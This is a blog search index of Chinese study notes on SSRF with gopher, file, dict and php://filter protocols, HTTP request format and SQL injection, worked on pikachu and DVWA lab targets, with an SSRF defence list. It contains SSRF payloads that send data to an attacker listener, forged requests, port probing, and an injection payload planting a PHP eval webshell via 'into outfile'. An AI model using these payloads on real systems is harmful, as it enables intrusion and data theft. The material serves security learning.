<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Gopher协议学习</title>
    <url>/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="Gopher协议的学习"><a href="#Gopher协议的学习" class="headerlink" title="Gopher协议的学习"></a>Gopher协议的学习</h4><h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；(百度百科)</p>
<h5 id="gopher协议格式"><a href="#gopher协议格式" class="headerlink" title="gopher协议格式:"></a>gopher协议格式:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher协议  URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 可用于构造Http请求包</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444  //kali开启4444端口进行监听 </span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" class="">

<h5 id="通过pikachu靶场演示"><a href="#通过pikachu靶场演示" class="headerlink" title="通过pikachu靶场演示"></a>通过pikachu靶场演示</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.159.132/pikachu/vul/ssrf/ssrf_info/info1.php //看到网站url参数为url=一个url 可能存在ssrf漏洞</span><br></pre></td></tr></table></figure>

<p>我们可以将url后面的参数改为gopheri协议像目标主机发送数据流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=gopher://kaliIP:端口号/这是我发送的数据</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" class="">

<p>可以看到kali这边成功的接收到了我们通过gopher协议传输的数据</p>
<h5 id="gopher协议发送GET、POST请求"><a href="#gopher协议发送GET、POST请求" class="headerlink" title="gopher协议发送GET、POST请求"></a>gopher协议发送GET、POST请求</h5><h6 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h6><p>步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、构造HTTP数据包</span><br><span class="line">2、URL编码、替换回车换行为%0d%0a</span><br><span class="line">3、发送gopher协议</span><br></pre></td></tr></table></figure>

<p>GET型的HTTP数据包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ssrf/base/get.php?url=test HTTP/1.1</span><br><span class="line">Host: 192.168.159.132</span><br></pre></td></tr></table></figure>

<p>为了方便我们直接在kali中进行演示</p>
<p>首先进入/var/www/html目录下创建gopher.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www   </span><br><span class="line">vim gopher.php</span><br></pre></td></tr></table></figure>

<p>将php代码写入gopher.php中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot; ?&gt;</span><br></pre></td></tr></table></figure>

<p>开启apache</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start apache2 //开启apache</span><br></pre></td></tr></table></figure>

<p>重新打开一个shell</p>
<p>输入命令 这里注意我们使用的是http数据包,我们每次在浏览器输入的参数等,浏览器都会进行url编码以后才会传输.</p>
<p>因此我们需要对输入的命令进行url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_GET%20/gopher.php%3fname=xiaobai%20HTTP/1.1%0d%0AHost:%20192.168.159.131%0d%0A </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、问号（？）需要转码为URL编码，也就是%3f</span><br><span class="line">2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</span><br><span class="line">3、在HTTP包的最后要加%0d%0a，代表消息结束 //具体http格式可参考之前写的http请求头学习的文章</span><br></pre></td></tr></table></figure>

<p>成功通过get方式发送http数据包</p>
<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" class="">

<h6 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h6><p>同样的方法先在html目录下创建gopher_post.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www</span><br><span class="line">vim gopher_post.php</span><br></pre></td></tr></table></figure>

<p>php代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>post请求包格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /gopher_post.php HTTP/1.1 //请求行</span><br><span class="line">host:192.168.159.131 //请求头 </span><br><span class="line"></span><br><span class="line">name=libo //请求实体 </span><br></pre></td></tr></table></figure>

<p>这里需要提醒一下,get请求包是没有请求实体的参数直接跟在了uri后面,而post请求包参数是放在请求实体的,具体详细信息可以参考我之前的文章HTTP请求头的学习文章有详细介绍.</p>
<p>url编码后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_POST%20/gopher_post.php%20HTTP/1.1%0d%0AHost:192.168.159.131%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:13%0d%0A%0d%0Aname=xiaobai%0d%0A </span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" class="">

<p>成功通过post方式发送数据包</p>
<p>注意:POST请求头在原有基础上多增加了Content-Type,Content-Length两个请求头参数.</p>
<blockquote>
<p>借鉴文章[Gopher协议在SSRF漏洞中的深入研究(<a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a>)</p>
</blockquote>
]]></content>
      <categories>
        <category>网络协议学习</category>
      </categories>
      <tags>
        <tag>http协议</tag>
        <tag>Gopher协议</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞及相关协议学习</title>
    <url>/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><h5 id="中文意思："><a href="#中文意思：" class="headerlink" title="中文意思："></a>中文意思：</h5><p>本地文件传输协议 </p>
<h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>File协议主要用于访问本地计算机中的文件。<br>File协议基本的格式如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///C:/file.txt //访问c盘下的file.txt文件</span><br></pre></td></tr></table></figure>

<p>基本格式这里可以借助http网址来理解</p>
<p>http网址基本格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号/文件路径</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<blockquote>
<p>因为file协议访问的是文件,并没有主机地址,所以就省去了host那部分就变成了最终上面的部分.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file协议:</span><br><span class="line"></span><br><span class="line">1. file协议主要用于读取服务器本地文件，访问的是本地的静态资源</span><br><span class="line"></span><br><span class="line">2. http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</span><br><span class="line"></span><br><span class="line">3. http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</span><br><span class="line"></span><br><span class="line">4. file对应的类似http的协议是ftp协议（文件传输协议）</span><br><span class="line"></span><br><span class="line">5. file不能跨域</span><br></pre></td></tr></table></figure>

<p>curl支持file协议,我们接下来将借助curl工具讲解file协议的用法</p>
<p>首先在/etc目录下创建文件file.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;hello file&quot; &gt;/etc/file.txt</span><br></pre></td></tr></table></figure>

<p>通过file协议访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl file:///etc/file.txt</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/1.png" class="">

<h4 id="Dict协议"><a href="#Dict协议" class="headerlink" title="Dict协议"></a>Dict协议</h4><h5 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h5><p>词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。（摘自百度百科）</p>
<h5 id="使用dict协议可以获取内网主机开放端口"><a href="#使用dict协议可以获取内网主机开放端口" class="headerlink" title="使用dict协议可以获取内网主机开放端口"></a>使用dict协议可以获取内网主机开放端口</h5><p>通过dict协议，可以看出目标端口的指纹信息，通过返回的指纹信息,判断开启的服务.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl dict://192.168.159.131:80  探测目标主机80端口是否开放及其对应服务</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/2.png" class="">

<h5 id="dict协议的使用："><a href="#dict协议的使用：" class="headerlink" title="dict协议的使用："></a>dict协议的使用：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. dict://serverip:port/命令:参数</span><br><span class="line">2. 向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</span><br><span class="line">3. 通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。</span><br></pre></td></tr></table></figure>

<h4 id="php中filter协议"><a href="#php中filter协议" class="headerlink" title="php中filter协议"></a>php中filter协议</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>PHP 过滤器用于对来自非安全来源的数据（比如用户输入）进行验证和过滤。</p>
<p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p>
<h5 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍:"></a>参数介绍:</h5><table>
<thead>
<tr>
<th><strong>名称</strong></th>
<th><strong>描述</strong></th>
<th><strong>备注</strong></th>
</tr>
</thead>
<tbody><tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>指定了你要筛选过滤的数据流。</td>
<td>必选</td>
</tr>
<tr>
<td>read=&lt;读链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
<td>可选</td>
</tr>
<tr>
<td>write=&lt;写链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
<td>可选</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
<h5 id="read参数值"><a href="#read参数值" class="headerlink" title="read参数值"></a>read参数值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string.strip_tags： //将数据流中的所有html标签清除</span><br><span class="line">string.toupper： //将数据流中的内容转换为大写</span><br><span class="line">string.tolower： //将数据流中的内容转换为小写</span><br><span class="line">convert.base64-encode： //将数据流中的内容转换为base64编码 </span><br></pre></td></tr></table></figure>

<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>这里我们通过皮卡出靶场的ssrf漏洞题目进行讲解</p>
<p>看到题目打开的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php </span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/3.png" class="">

<p>我们可以通过php://filter协议来查看源文件内容；</p>
<p>首先我们在靶机当前目录下创建filter.php</p>
<p>内容为echo “Hello phpFilter”</p>
<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/4.png" class="">

<p>然后我们通过构造payload远程访问filter文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=filter.php </span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/5.png" class="">

<p>返回一串编码,这串编码就是我们base64编码后的文件内容,</p>
<p>解码验证</p>
<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/6.png" class="">

<p>当然我们可以通过filter协议构造恶意的payload访问服务器的隐私数据.</p>
<h4 id="0x01-SSRF-漏洞描述"><a href="#0x01-SSRF-漏洞描述" class="headerlink" title="0x01:SSRF 漏洞描述"></a>0x01:SSRF 漏洞描述</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的</span><br><span class="line">安全漏洞。一般情况下，SSRF 攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所</span><br><span class="line">以服务端能请求到与自身相连而与外网隔离的内部系统)</span><br></pre></td></tr></table></figure>

<h4 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSRF 的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span><br><span class="line">例如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请</span><br><span class="line">求伪造。SSRF 利用存在缺陷的 Web 应用作为代理攻击远程和本地的服务器。</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/7.png" class="">

<h4 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h4><ul>
<li><pre><code>- 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的
- 文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
- 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题
- 设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）
- 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090
- 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
</code></pre>
<blockquote>
<p>借鉴:实训讲义</p>
<p>(<a href="https://www.cnblogs.com/tig666666/p/6020460.html">https://www.cnblogs.com/tig666666/p/6020460.html</a>)</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>File协议</tag>
        <tag>Dict协议</tag>
        <tag>Filter协议</tag>
      </tags>
  </entry>
  <entry>
    <title>网络学习</title>
    <url>/2021/12/26/http%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="http的学习"><a href="#http的学习" class="headerlink" title="http的学习"></a>http的学习</h1><h3 id="昨天看了mj老师关于http中请求头中参数的讲解-收获了很多-特此整理成笔记记录-方便以后的复习"><a href="#昨天看了mj老师关于http中请求头中参数的讲解-收获了很多-特此整理成笔记记录-方便以后的复习" class="headerlink" title="昨天看了mj老师关于http中请求头中参数的讲解,收获了很多,特此整理成笔记记录,方便以后的复习."></a>昨天看了mj老师关于http中请求头中参数的讲解,收获了很多,特此整理成笔记记录,方便以后的复习.</h3><h4 id="请求头部分字段"><a href="#请求头部分字段" class="headerlink" title="请求头部分字段"></a>请求头部分字段</h4><table>
<thead>
<tr>
<th align="center">头字段名</th>
<th align="center">说明</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Accept</td>
<td align="center">服务器能够接受的响应文件类型</td>
<td align="center">Accept:text/html</td>
</tr>
<tr>
<td align="center">Accept-Charset</td>
<td align="center">服务器能够接受的字符集</td>
<td align="center">Accept-Charset:GB2312,utf-8:q=0.9,*:q=.0.7</td>
</tr>
<tr>
<td align="center">Accept-Encoding</td>
<td align="center">服务器能够接受的编码方式</td>
<td align="center">Accept-Encoding: gzip, deflate</td>
</tr>
<tr>
<td align="center">Accept-Language</td>
<td align="center">服务器能够接受的语言列表</td>
<td align="center">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</td>
</tr>
<tr>
<td align="center">cookie</td>
<td align="center">之前由服务器通过set-cookie发送的cokkie</td>
<td align="center">security=medium; security_level=0; PHPSESSID=cr1e09stcvf5a2ndbi4skmcde1</td>
</tr>
</tbody></table>
<h5 id="请求包格式讲解"><a href="#请求包格式讲解" class="headerlink" title="请求包格式讲解:"></a>请求包格式讲解:</h5><p>请求行:方法名 对应的url http版本 当然可以通过wireshark抓包查看最原始的请求行.</p>
<p>版本号 url http版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /busuanzi?jsonpCallback=BusuanziCallback_816608165920 HTTP/1.1 </span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/http%E5%AD%A6%E4%B9%A0/2.png" class="">

<p>请求头部由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔。请求头部通知服务器有关于客户端请求的信息.</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent：产生请求的浏览器类型。</span><br><span class="line"></span><br><span class="line">Accept：客户端可识别的内容类型列表。</span><br><span class="line"></span><br><span class="line">Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机。</span><br></pre></td></tr></table></figure>

<p>最后一个请求头之后是一个空行，发送回车符和换行符，通知服务器以下不再有请求头。</p>
<p>请求实体:get请求中不存在请求实体,post请求中请求实体往往保存请求的参数相关内容</p>
<span id="more"></span>

<h5 id="优先级讲解"><a href="#优先级讲解" class="headerlink" title="优先级讲解:"></a>优先级讲解:</h5><p>各字段以逗号隔开,每个字段名的值可以有不同类型,实例中p,q参数的值代表优先级(权值),默认为1,值越大优先级越高.例如Accept-Charset:GB2312,utf-8:q=0.9,*:q=.0.7表示GB2312和utf-8的字符优先级为0.9,**代表除了特意指明字符以外的字符集优先级为0.7,通俗的意思就是讲客户端希望优先接收到Charset:GB2312,utf-8的字符集,当然服务器可能会不支持这两种字符,因此会在后面默认这两种字符外的其他字符的优先级.</p>
<h5 id="状态码分类"><a href="#状态码分类" class="headerlink" title="状态码分类"></a>状态码分类</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1xx	信息，服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2xx	成功，操作被成功接收并处理</span><br><span class="line">3xx	重定向，需要进一步的操作以完成请求</span><br><span class="line">4xx	客户端错误，请求包含语法错误或无法完成请求</span><br><span class="line">5xx	服务器错误，服务器在处理请求的过程中发生了错误</span><br></pre></td></tr></table></figure>



<h4 id="form表单的两种提交方式"><a href="#form表单的两种提交方式" class="headerlink" title="form表单的两种提交方式"></a>form表单的两种提交方式</h4><p>①是请求方法，HTTP/1.1 定义的请求方法有8种：GET、POST、PUT、DELETE、PATCH、HEAD、OPTIONS、TRACE,这里只介绍常用的两种方法</p>
<h6 id="get请求"><a href="#get请求" class="headerlink" title="get请求:"></a>get请求:</h6><p>参数直接跟在url后面,请求包中并没有请求实体,直接从指定的资源请求数据</p>
<ul>
<li>GET 请求可被缓存</li>
<li>GET 请求保留在浏览器历史记录中</li>
<li>GET 请求可被收藏为书签</li>
<li>GET 请求不应在处理敏感数据时使用</li>
<li>GET 请求有长度限制</li>
<li>GET 请求只应当用于取回数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /service/msn/user?apikey=0QfOX3Vn51YCzitbLaRkTTBadtWpgTN8NZLW0C1SEM&amp;activityId=B827D662-6422-42D6-9141-4FF4DF2AE8C0 //参数直接附在url后面直接请求资源.</span><br></pre></td></tr></table></figure>

<h6 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h6><p><strong>请注意，查询字符串（名称/值对）是在 POST 请求的 HTTP 消息主体中发送的：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /01/vulnerabilities/sqli/ HTTP/1.1</span><br><span class="line">Host: 192.168.0.28</span><br><span class="line"></span><br><span class="line">id=2+union+select+%22%3C%3Fphp+%40eval%28%24_POST%5Bcmd%5D%29%3B+%3F%3E%22+into+outfile+%22%2Fvar%2Fwww%2Fhtml%2F5.php%22%2C2+&amp;Submit=Submit //参数并不直接附在url后面,而是通过请求实体传输参数.</span><br></pre></td></tr></table></figure>

<p><strong>有关 POST 请求的其他一些注释：</strong></p>
<ul>
<li><p>POST 请求不会被缓存</p>
</li>
<li><p>POST 请求不会保留在浏览器历史记录中</p>
</li>
<li><p>POST 不能被收藏为书签</p>
</li>
<li><p>POST 请求对数据长度没有要求</p>
<h4 id="enctype-POST请求时-请求体的编码方式"><a href="#enctype-POST请求时-请求体的编码方式" class="headerlink" title="enctype:POST请求时,请求体的编码方式"></a><strong>enctype:POST请求时,请求体的编码方式</strong></h4><p>通常附在form表单中,默认为application/x-www-form-urlencoded编码,文件类型不支持该编码方式,当用此编码方式时会拒绝接受文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;/cs/login&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>application/x-www-form-urlencoded:请求的参数用&amp;分隔,用=分隔键和值,字符用URL编码方式进行编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<p>multipart/form-data:支持接受文件类型,文件上传必须使用这种编码方式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;/cs/login&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/http%E5%AD%A6%E4%B9%A0/3.png" class="">



]]></content>
      <categories>
        <category>计算机网络学习</category>
      </categories>
      <tags>
        <tag>session</tag>
        <tag>form表单</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入学习</title>
    <url>/2021/12/26/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h4 id="前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾"><a href="#前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾" class="headerlink" title="前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾"></a>前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾</h4><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>我将通过DVWA靶场中的sql题目讲解SQL注入</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p>SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，前端传入后端的参数是攻击者可控的，攻击者可以通过构造不同的SQL语句来实现对数据库查询、删除，增加，修改数据等等操作，如果数据库的用户权限足够大，还可以对操作系统执行操作.</p>
<h5 id="类型"><a href="#类型" class="headerlink" title="类型:"></a>类型:</h5><h6 id="依据注入点类型分类"><a href="#依据注入点类型分类" class="headerlink" title="依据注入点类型分类"></a><strong>依据注入点类型分类</strong></h6><p>​    数字类型的注入</p>
<p>​    字符串类型的注入</p>
<p>​    搜索型注入</p>
<span id="more"></span>

<h6 id="依据提交方式分类"><a href="#依据提交方式分类" class="headerlink" title="依据提交方式分类"></a><strong>依据提交方式分类</strong></h6><p>​    GET注入</p>
<p>​    POST注入</p>
<p>​    COOKIE注入</p>
<p>​    HTTP头注入</p>
<h6 id="依据获取信息的方式分类"><a href="#依据获取信息的方式分类" class="headerlink" title="依据获取信息的方式分类"></a><strong>依据获取信息的方式分类</strong></h6><p>​    基于布尔的盲注</p>
<p>​    基于时间的盲注</p>
<p>​    基于报错的注入</p>
<p>​    联合查询注入</p>
<h6 id="堆查询注入-可同时执行多条语句"><a href="#堆查询注入-可同时执行多条语句" class="headerlink" title="堆查询注入 (可同时执行多条语句)"></a>堆查询注入 (可同时执行多条语句)</h6><h4 id="首先我们需要对数据库的基础知识有一定的了解"><a href="#首先我们需要对数据库的基础知识有一定的了解" class="headerlink" title="首先我们需要对数据库的基础知识有一定的了解"></a>首先我们需要对数据库的基础知识有一定的了解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql中注释符：# 、/**/ 、 --</span><br><span class="line"></span><br><span class="line">information_schema数据库中三个很重要的表：</span><br><span class="line"></span><br><span class="line">       information_schema.schemata: 该数据表存储了mysql数据库中的所有数据库的库名</span><br><span class="line"></span><br><span class="line">       information_schema.tables： 该数据表存储了mysql数据库中的所有数据表的表名</span><br><span class="line"></span><br><span class="line">       information_schema.columns: 该数据表存储了mysql数据库中的所有列的列名</span><br></pre></td></tr></table></figure>

<h6 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 库名1 character set utf-8; //创建数据库并库编码集为utf-8 支持中文</span><br></pre></td></tr></table></figure>

<h6 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Product</span><br><span class="line">(字段1     CHAR(4)      NOT NULL,  </span><br><span class="line"> 字段2   VARCHAR(100) NOT NULL,</span><br><span class="line"> 字段3   VARCHAR(32)  NOT NULL,  //字段1,2,3不能为空</span><br><span class="line"> 字段4     INTEGER  );</span><br></pre></td></tr></table></figure>

<p>每一列的数据类型（后述）是必须要指定的，数据类型包括：</p>
<ul>
<li>INTEGER 整数型</li>
<li>NUMERIC ( 全体位数, 小数位数)</li>
<li>CHAR 字符串,长度不能改变</li>
<li>VARCHAR 字符串,长度可以改变</li>
<li>DATE 日期型</li>
</ul>
<h6 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名1,字段名2,字段名3 from 库1.表1 ;//查询库1里面表1的对应记录</span><br></pre></td></tr></table></figure>

<p>当我们只想查找某条记录时,我们可以加上where语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名1,字段名2,字段名3 from 库1.表1 where 字段名1=&#x27;xx&#x27;; //查询库1里面表1的字段名为1的对应记录</span><br></pre></td></tr></table></figure>

<h6 id="更新语句"><a href="#更新语句" class="headerlink" title="更新语句"></a>更新语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表1</span><br><span class="line">   SET 字段1 = &#x27;xxx&#x27;; //更新表1字段1数据为xxx</span><br></pre></td></tr></table></figure>

